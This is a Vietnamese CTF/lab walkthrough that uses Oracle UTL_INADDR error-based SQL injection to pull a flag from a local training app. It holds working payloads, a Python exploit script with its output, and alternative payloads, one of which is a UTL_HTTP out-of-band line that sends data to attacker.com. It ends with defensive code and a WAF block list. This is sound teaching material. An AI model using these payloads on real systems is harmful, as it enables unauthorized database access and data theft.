# SQLi-014 Solution: Oracle UTL_INADDR Error-based Injection

## 📋 Thông Tin Challenge

- **URL:** `http://localhost:5014/customer?id=1`
- **Tham số vulnerable:** `id`
- **Kỹ thuật:** Oracle UTL_INADDR.GET_HOST_NAME Error-based Injection
- **Target:** Bảng `secrets`, cột `value`
- **DBMS:** Oracle Database

---

## 🔍 BƯỚC 1: Detection - Phát Hiện Lỗi

### 1.1. Test Basic Injection

```
http://localhost:5014/customer?id=1'
```

**Kết quả:**

```
ORA-01756: quoted string not properly terminated
Help: https://docs.oracle.com/error-help/db/ora-01756/
```

✅ **Kết luận:** Có SQL Injection!

### 1.2. Test Comment Syntax

**Oracle sử dụng `--` cho single-line comment:**

```
http://localhost:5014/customer?id=1'--
```

**Kết quả:** Vẫn báo lỗi vì query không đóng đúng

**Thử với space sau `--`:**

```
http://localhost:5014/customer?id=1'--
http://localhost:5014/customer?id=1'-- -
```

**Kết quả:** Trả về bình thường

✅ **Kết luận:** Oracle comment syntax hoạt động!

### 1.3. Test Boolean-based

```
http://localhost:5014/customer?id=1 AND 1=1--
http://localhost:5014/customer?id=1 AND 1=2--
```

**Kết quả:**

- `1=1` → Hiển thị customer
- `1=2` → Không hiển thị

✅ **Có thể inject logic!**

### 1.4. Identify Error Pattern

```
http://localhost:5014/customer?id=1'
```

**Error format:**

```
ORA-XXXXX: error message
Help: https://docs.oracle.com/error-help/db/ora-xxxxx/
```

✅ **Đây là Oracle Database!** (Error code format `ORA-XXXXX` là đặc trưng)

---

## 🎯 BƯỚC 2: Fingerprint Oracle Database

### 2.1. Confirm Oracle với DUAL Table

Oracle có system table đặc biệt tên `DUAL`:

```
http://localhost:5014/customer?id=1 AND 1=(SELECT COUNT(*) FROM dual)--
```

**Kết quả:** Trả về bình thường

✅ **Chắc chắn là Oracle!** (Chỉ Oracle có `dual` table)

### 2.2. Get Oracle Version

**Test với BANNER:**

```
http://localhost:5014/customer?id=1 AND 1=(SELECT 1 FROM v$version WHERE ROWNUM=1)--
```

**Kết quả:** Hoạt động (nhưng không leak data)

**Test với error-based thông thường:**

```
http://localhost:5014/customer?id=1 AND 1=(SELECT CAST(banner AS NUMBER) FROM v$version WHERE ROWNUM=1)--
```

**Kết quả:**

```
ORA-01722: invalid number
```

⚠️ Không leak được data trong error message như MySQL/MSSQL!

### 2.3. Oracle Error-based Techniques

Oracle có các function đặc biệt để trigger error với data:

| Function                       | Purpose       | Error Message Pattern         |
| ------------------------------ | ------------- | ----------------------------- |
| **UTL_INADDR.GET_HOST_NAME()** | DNS lookup    | `ORA-29257: host XXX unknown` |
| **CTXSYS.DRITHSX.SN()**        | XML parsing   | `ORA-20000: XXX`              |
| **DBMS_XDB_VERSION.CHECKIN()** | Version check | `ORA-XXXXX: XXX`              |
| **UTL_HTTP.REQUEST()**         | HTTP request  | Network error với data        |

**Best choice:** `UTL_INADDR.GET_HOST_NAME()` - Đơn giản và data leak rõ ràng!

---

## 🧠 BƯỚC 3: Hiểu UTL_INADDR.GET_HOST_NAME

### 3.1. UTL_INADDR Package

**UTL_INADDR** là Oracle package để làm việc với network addresses.

**Function GET_HOST_NAME:**

```sql
UTL_INADDR.GET_HOST_NAME(ip_address VARCHAR2) RETURN VARCHAR2
```

- Input: IP address hoặc hostname
- Output: Hostname tương ứng
- **Nếu host không tồn tại → ERROR với hostname trong message!**

### 3.2. Error-based Mechanism

```sql
-- Normal usage
SELECT UTL_INADDR.GET_HOST_NAME('8.8.8.8') FROM dual;
→ Returns: 'dns.google'

-- With non-existent host
SELECT UTL_INADDR.GET_HOST_NAME('invalid_host_12345') FROM dual;
→ Error: ORA-29257: host invalid_host_12345 unknown

-- Inject data into error
SELECT UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)) FROM dual;
→ Error: ORA-29257: host APP_USER unknown
```

✅ **Data `APP_USER` leaked trong error message!**

### 3.3. Why This Works

1. `SELECT user FROM dual` → Returns username string
2. `UTL_INADDR.GET_HOST_NAME(username)` → Tries DNS lookup
3. Username is not a valid hostname → DNS lookup fails
4. Oracle throws error: `ORA-29257: host [username] unknown`
5. **Data extracted from error message!**

### 3.4. ACL Requirement

Oracle 11g+ yêu cầu **ACL (Access Control List)** để sử dụng network functions:

```sql
-- Grant ACL cho user
BEGIN
  DBMS_NETWORK_ACL_ADMIN.CREATE_ACL(
    acl         => 'app_user_acl.xml',
    description => 'ACL for app_user',
    principal   => 'APP_USER',
    is_grant    => TRUE,
    privilege   => 'resolve'
  );
  DBMS_NETWORK_ACL_ADMIN.ASSIGN_ACL(
    acl  => 'app_user_acl.xml',
    host => '*'
  );
  COMMIT;
END;
```

⚠️ **Nếu không có ACL → Error: `ORA-24247: network access denied by ACL`**

---

## 🔎 BƯỚC 4: Test UTL_INADDR Error-based

### 4.1. Get Current User

```
GET /customer?id=1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- HTTP/1.1
```

**URL Encoded:**

```
http://localhost:5014/customer?id=1%20AND%201%3dUTL_INADDR.GET_HOST_NAME((SELECT%20user%20FROM%20dual))--
```

**Kết quả:**

```
ORA-29257: host APP_USER unknown
ORA-06512: at "SYS.UTL_INADDR", line 4
ORA-06512: at "SYS.UTL_INADDR", line 35
ORA-06512: at line 1
```

✅ **Current user:** `APP_USER`

### 4.2. Get Database Version

```
http://localhost:5014/customer?id=1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--
```

**Kết quả:**

```
ORA-29257: host Oracle Database 21c Express Edition Release 21.0.0.0.0 - Production unknown
```

✅ **Database version:** Oracle 21c Express Edition

### 4.3. Get Database Name

```
http://localhost:5014/customer?id=1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT name FROM v$database))--
```

**Kết quả:**

```
ORA-29257: host XE unknown
```

✅ **Database name:** `XE` (Oracle Express Edition)

---

## 🗂️ BƯỚC 5: Enumerate Tables

### 5.1. Count User Tables

```
http://localhost:5014/customer?id=1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT TO_CHAR(COUNT(*)) FROM user_tables))--
```

**Kết quả:**

```
ORA-29257: host 2 unknown
```

✅ **Có 2 user tables**

### 5.2. Get First Table Name

```
http://localhost:5014/customer?id=1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT table_name FROM user_tables WHERE ROWNUM=1))--
```

**Kết quả:**

```
ORA-29257: host CUSTOMERS unknown
```

✅ **First table:** `CUSTOMERS`

### 5.3. Get Second Table Name

```
http://localhost:5014/customer?id=1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT table_name FROM user_tables WHERE table_name NOT IN ('CUSTOMERS') AND ROWNUM=1))--
```

**Kết quả:**

```
ORA-29257: host SECRETS unknown
```

✅ **Second table:** `SECRETS` ← **Target!**

### 5.4. Alternative: Concatenate All Tables

**Oracle concatenation với `||`:**

```
http://localhost:5014/customer?id=1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables))--
```

**Kết quả:**

```
ORA-29257: host CUSTOMERS,SECRETS unknown
```

✅ **All tables:** `CUSTOMERS, SECRETS`

---

## 🔐 BƯỚC 6: Enumerate Columns từ Table SECRETS

### 6.1. Count Columns

```
http://localhost:5014/customer?id=1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT TO_CHAR(COUNT(*)) FROM user_tab_columns WHERE table_name='SECRETS'))--
```

**Kết quả:**

```
ORA-29257: host 3 unknown
```

✅ **Table SECRETS có 3 columns**

### 6.2. Get All Column Names

```
http://localhost:5014/customer?id=1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_id) FROM user_tab_columns WHERE table_name='SECRETS'))--
```

**Kết quả:**

```
ORA-29257: host ID,NAME,VALUE unknown
```

✅ **Columns:** `ID`, `NAME`, `VALUE`

### 6.3. Alternative: Get One by One

**First column:**

```
http://localhost:5014/customer?id=1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT column_name FROM user_tab_columns WHERE table_name='SECRETS' AND ROWNUM=1 ORDER BY column_id))--
→ ORA-29257: host ID unknown
```

**Second column:**

```
http://localhost:5014/customer?id=1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT column_name FROM user_tab_columns WHERE table_name='SECRETS' AND column_name NOT IN ('ID') AND ROWNUM=1))--
→ ORA-29257: host NAME unknown
```

---

## 🚀 BƯỚC 7: Extract Flag

### 7.1. Count Rows in SECRETS

```
http://localhost:5014/customer?id=1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT TO_CHAR(COUNT(*)) FROM secrets))--
```

**Kết quả:**

```
ORA-29257: host 1 unknown
```

✅ **1 row trong table secrets**

### 7.2. Extract Flag Value

**Final Payload:**

```
http://localhost:5014/customer?id=1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT value FROM secrets WHERE ROWNUM=1))--
```

**URL Encoded:**

```
GET /customer?id=1%20AND%201%3dUTL_INADDR.GET_HOST_NAME((SELECT%20value%20FROM%20secrets%20WHERE%20ROWNUM%3d1))-- HTTP/1.1
```

**Kết quả:**

```
ORA-29257: host FLAG{0r4cl3_utl_1n4ddr_3rr0r} unknown
ORA-06512: at "SYS.UTL_INADDR", line 4
ORA-06512: at "SYS.UTL_INADDR", line 35
ORA-06512: at line 1
```

✅ **FLAG:** `FLAG{0r4cl3_utl_1n4ddr_3rr0r}`

### 7.3. Extract Multiple Rows (nếu có)

```
-- First row
SELECT value FROM secrets WHERE ROWNUM=1

-- Second row
SELECT value FROM secrets WHERE value NOT IN (SELECT value FROM secrets WHERE ROWNUM=1) AND ROWNUM=1

-- All rows concatenated
SELECT LISTAGG(value,'|') WITHIN GROUP (ORDER BY id) FROM secrets
```

---

## 🔧 BƯỚC 8: Automation Script

### 8.1. Python Script

```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import quote

BASE_URL = "http://localhost:5014/customer"

def extract_from_error(payload):
    """Extract data from UTL_INADDR error message"""
    r = requests.get(BASE_URL, params={"id": payload})
    match = re.search(r"ORA-29257: host (.+?) unknown", r.text)
    return match.group(1) if match else None

print("[*] Step 1: Get current user")
payload1 = "1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--"
user = extract_from_error(payload1)
print(f"[+] Current User: {user}\n")

print("[*] Step 2: Get database version")
payload2 = "1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--"
version = extract_from_error(payload2)
print(f"[+] Version: {version}\n")

print("[*] Step 3: Get database name")
payload3 = "1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT name FROM v$database))--"
db_name = extract_from_error(payload3)
print(f"[+] Database Name: {db_name}\n")

print("[*] Step 4: Enumerate tables")
payload4 = "1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables))--"
tables = extract_from_error(payload4)
print(f"[+] Tables: {tables}\n")

print("[*] Step 5: Get columns from SECRETS table")
payload5 = "1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_id) FROM user_tab_columns WHERE table_name='SECRETS'))--"
columns = extract_from_error(payload5)
print(f"[+] Columns in SECRETS: {columns}\n")

print("[*] Step 6: Extract flag")
payload6 = "1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT value FROM secrets WHERE ROWNUM=1))--"
flag = extract_from_error(payload6)
print(f"[+] Flag: {flag}")
```

### 8.2. Chạy Script

```bash
python3 exploit.py
```

**Output:**

```
[*] Step 1: Get current user
[+] Current User: APP_USER

[*] Step 2: Get database version
[+] Version: Oracle Database 21c Express Edition Release 21.0.0.0.0 - Production

[*] Step 3: Get database name
[+] Database Name: XE

[*] Step 4: Enumerate tables
[+] Tables: CUSTOMERS,SECRETS

[*] Step 5: Get columns from SECRETS table
[+] Columns in SECRETS: ID,NAME,VALUE

[*] Step 6: Extract flag
[+] Flag: FLAG{0r4cl3_utl_1n4ddr_3rr0r}
```

---

## 📊 BƯỚC 9: Tổng Kết

### 9.1. Complete Exploitation Chain

```
1. Detection:
   1'-- (check Oracle error format ORA-XXXXX)

2. Confirm Oracle:
   1 AND 1=(SELECT COUNT(*) FROM dual)--

3. Get User:
   1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--

4. Get Version:
   1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--

5. Enumerate Tables:
   1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name) FROM user_tables))--

6. Enumerate Columns:
   1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_id) FROM user_tab_columns WHERE table_name='SECRETS'))--

7. Extract Data:
   1 AND 1=UTL_INADDR.GET_HOST_NAME((SELECT value FROM secrets WHERE ROWNUM=1))--
```

### 9.2. Key Oracle Syntax Differences

| Feature           | MySQL            | MSSQL                     | Oracle           |
| ----------------- | ---------------- | ------------------------- | ---------------- |
| **Comment**       | `-- ` or `#`     | `--`                      | `-- `            |
| **String concat** | `CONCAT()`       | `+`                       | `\|\|`           |
| **Limit rows**    | `LIMIT 1`        | `TOP 1`                   | `WHERE ROWNUM=1` |
| **Dummy table**   | N/A              | N/A                       | `FROM dual`      |
| **String agg**    | `GROUP_CONCAT()` | `STRING_AGG()` or FOR XML | `LISTAGG()`      |

### 9.3. So Sánh Error-based Techniques

| DBMS       | Technique   | Function                     | Error Pattern                     |
| ---------- | ----------- | ---------------------------- | --------------------------------- |
| MySQL      | XPATH       | ExtractValue/UpdateXML       | XPATH syntax error: '~data'       |
| MSSQL      | Type Cast   | CONVERT/CAST                 | converting nvarchar 'data' to int |
| **Oracle** | **Network** | **UTL_INADDR.GET_HOST_NAME** | **host data unknown**             |

### 9.4. Challenge Progression

| Challenge    | DBMS       | Technique              | Key Learning               |
| ------------ | ---------- | ---------------------- | -------------------------- |
| SQLi-009     | MySQL      | ExtractValue           | XPATH error, 32 char limit |
| SQLi-010     | MySQL      | UpdateXML              | Alternative XPATH          |
| SQLi-011     | MySQL      | ExtractValue+SUBSTRING | Bypass length limit        |
| SQLi-012     | MSSQL      | CONVERT                | Type conversion error      |
| SQLi-013     | MSSQL      | FOR XML PATH           | Multiple rows concat       |
| **SQLi-014** | **Oracle** | **UTL_INADDR**         | **Network function error** |

---

## 🎓 BƯỚC 10: Kiến Thức Mở Rộng

### 10.1. Alternative Oracle Error-based Techniques

**1. CTXSYS.DRITHSX.SN (Oracle Text)**

```sql
1 AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))=1--
→ Error với user data
```

**2. DBMS_XDB_VERSION.CHECKIN**

```sql
1 AND (SELECT DBMS_XDB_VERSION.CHECKIN((SELECT user FROM dual)) FROM dual) IS NULL--
→ Error với user data
```

**3. UTL_HTTP.REQUEST**

```sql
1 AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual) IS NULL--
→ Out-of-band với user data trong URL
```

**4. XMLType Error**

```sql
1 AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual) IS NULL--
→ XML parsing error với data
```

### 10.2. Oracle System Tables

**Database Metadata:**

```sql
-- List all tables
SELECT table_name FROM user_tables
SELECT table_name FROM all_tables WHERE owner='APP_USER'

-- List columns
SELECT column_name FROM user_tab_columns WHERE table_name='SECRETS'

-- Database version
SELECT banner FROM v$version
SELECT * FROM product_component_version

-- Current user
SELECT user FROM dual
SELECT sys_context('USERENV','SESSION_USER') FROM dual

-- Database name
SELECT name FROM v$database
SELECT ora_database_name FROM dual
```

**Privileges:**

```sql
-- Current user privileges
SELECT * FROM user_sys_privs
SELECT * FROM user_tab_privs

-- Check if DBA
SELECT * FROM session_privs WHERE privilege='DBA'
```

### 10.3. ROWNUM vs ROW_NUMBER()

**ROWNUM (older Oracle):**

```sql
-- First row
SELECT * FROM table WHERE ROWNUM=1

-- Skip first row (doesn't work as expected)
SELECT * FROM table WHERE ROWNUM>1  -- Returns nothing!

-- Correct way to skip rows
SELECT * FROM (
  SELECT t.*, ROWNUM rn FROM table t
) WHERE rn > 1
```

**ROW_NUMBER() (Oracle 8i+):**

```sql
-- More flexible
SELECT * FROM (
  SELECT t.*, ROW_NUMBER() OVER (ORDER BY id) rn
  FROM table t
) WHERE rn BETWEEN 2 AND 5
```

### 10.4. LISTAGG Function

**Concatenate rows với delimiter:**

```sql
-- Basic usage
SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_id)
FROM user_tab_columns
WHERE table_name='SECRETS'
→ 'ID,NAME,VALUE'

-- With custom separator
SELECT LISTAGG(column_name, ' | ') WITHIN GROUP (ORDER BY column_id)
FROM user_tab_columns
WHERE table_name='SECRETS'
→ 'ID | NAME | VALUE'

-- Alternative: WM_CONCAT (deprecated)
SELECT WM_CONCAT(column_name) FROM user_tab_columns WHERE table_name='SECRETS'
→ 'ID,NAME,VALUE'
```

### 10.5. ACL Management

**Check existing ACLs:**

```sql
-- View ACLs
SELECT acl, principal, privilege
FROM dba_network_acl_privileges;

-- Check if user has network access
SELECT host, lower_port, upper_port, privilege
FROM dba_network_acls
WHERE acl IN (
  SELECT acl FROM dba_network_acl_privileges
  WHERE principal='APP_USER'
);
```

**Grant ACL programmatically:**

```sql
BEGIN
  DBMS_NETWORK_ACL_ADMIN.CREATE_ACL(
    acl         => 'app_user_acl.xml',
    description => 'Network ACL for app_user',
    principal   => 'APP_USER',
    is_grant    => TRUE,
    privilege   => 'resolve'
  );

  DBMS_NETWORK_ACL_ADMIN.ASSIGN_ACL(
    acl  => 'app_user_acl.xml',
    host => '*',
    lower_port => NULL,
    upper_port => NULL
  );

  COMMIT;
END;
/
```

---

## 🛡️ BƯỚC 11: Defense & Mitigation

### 11.1. Vulnerable Code

```python
# VULNERABLE
customer_id = request.args.get('id')
query = f"SELECT * FROM customers WHERE id = {customer_id}"
cursor.execute(query)
```

❌ **Vấn đề:**

- String concatenation
- Không bind variables
- Oracle errors exposed

### 11.2. Secure Code - Bind Variables

```python
# SECURE - Oracle bind variables
customer_id = request.args.get('id')
cursor.execute("SELECT * FROM customers WHERE id = :id", {'id': customer_id})

# Alternative syntax
cursor.execute("SELECT * FROM customers WHERE id = :1", [customer_id])
```

✅ **Lợi ích:**

- Input automatically escaped
- SQL parsing cached (performance boost)
- Prevents SQL Injection completely

### 11.3. Error Handling

```python
# VULNERABLE - Expose Oracle errors
try:
    cursor.execute(query)
except oracledb.Error as e:
    return f"Database error: {e}", 500  # ❌ Exposes ORA-XXXXX

# SECURE - Generic error
try:
    cursor.execute(query)
except oracledb.Error as e:
    app.logger.error(f"Database error: {e}")  # Log internally
    return "An error occurred", 500  # ✅ Generic message
```

### 11.4. Disable Network Functions

```sql
-- Revoke execute on UTL packages
REVOKE EXECUTE ON UTL_INADDR FROM PUBLIC;
REVOKE EXECUTE ON UTL_HTTP FROM PUBLIC;
REVOKE EXECUTE ON UTL_TCP FROM PUBLIC;

-- Remove ACLs
BEGIN
  DBMS_NETWORK_ACL_ADMIN.DROP_ACL(acl => 'app_user_acl.xml');
  COMMIT;
END;
/
```

### 11.5. Least Privilege

```sql
-- Create limited user
CREATE USER app_user IDENTIFIED BY secure_password;

-- Grant only necessary privileges
GRANT CREATE SESSION TO app_user;
GRANT SELECT ON customers TO app_user;

-- NO GRANT on:
-- - System views (v$version, v$database)
-- - All_tables, user_tables
-- - Network packages (UTL_*)
-- - DBA views
```

### 11.6. Input Validation

```python
def validate_customer_id(cid):
    """Validate customer ID is a positive integer"""
    try:
        cid_int = int(cid)
        if cid_int <= 0:
            raise ValueError("Invalid ID")
        return cid_int
    except (ValueError, TypeError):
        raise ValueError("ID must be a positive integer")

# Usage
customer_id = validate_customer_id(request.args.get('id'))
```

### 11.7. WAF Rules

```
Block patterns:
- UTL_INADDR, UTL_HTTP, UTL_TCP
- CTXSYS.DRITHSX.SN
- DBMS_XDB_VERSION
- v$version, v$database
- user_tables, all_tables
- LISTAGG, WM_CONCAT
- Multiple SQL keywords in parameters
```

---

## 🎯 Next Steps

**Continue Learning:**

- [SQLi-015: Oracle Out-of-Band Injection](../../SQLi-015/) (coming soon)
- [SQLi-016: Oracle Blind Injection](../../SQLi-016/) (coming soon)

**Practice More Oracle Functions:**

```sql
-- Get tablespace info
UTL_INADDR.GET_HOST_NAME((SELECT tablespace_name FROM user_tablespaces WHERE ROWNUM=1))

-- Get database parameters
UTL_INADDR.GET_HOST_NAME((SELECT value FROM v$parameter WHERE name='db_name'))

-- Extract sensitive data with formatting
UTL_INADDR.GET_HOST_NAME((SELECT name||':'||value FROM secrets WHERE ROWNUM=1))
```

---

## 📚 References

- [Oracle UTL_INADDR Documentation](https://docs.oracle.com/en/database/oracle/oracle-database/21/arpls/UTL_INADDR.html)
- [Oracle Network ACL Guide](https://docs.oracle.com/en/database/oracle/oracle-database/21/dbseg/managing-fine-grained-access-in-pl-sql-packages.html)
- [OWASP SQL Injection - Oracle](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection - Oracle](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

**🏁 Challenge Complete! Flag extracted using Oracle UTL_INADDR error-based injection technique.**
